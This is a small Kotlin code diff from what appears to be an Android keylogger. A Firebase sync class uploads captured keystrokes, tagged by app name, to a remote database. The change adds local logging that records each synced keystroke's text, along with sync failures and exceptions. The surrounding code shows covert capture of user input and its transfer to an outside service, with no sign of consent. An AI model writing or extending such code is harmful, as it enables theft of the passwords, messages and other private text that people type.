@@ -31,12 +31,15 @@ class FirebaseSyncManager {
                     ref.child(appName).child(timestampKey).setValue(logData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Keystroke synced successfully: $text")
+                            LogStore.addLog("Keystroke synced ($appName): $text")
                         }
-                        .addOnFailureListener { e ->
+                        .addOnFailureListener { e: Exception ->
                             Log.e(TAG, "Failed to sync keystroke", e)
+                            LogStore.addLog("Keystroke sync FAILED: ${e.toString()}")
                         }
                 } catch (e: Exception) {
                     Log.e(TAG, "Exception in logKeystroke", e)
+                    LogStore.addLog("Keystroke exception: ${e.toString()}")
                 }
             }
         }
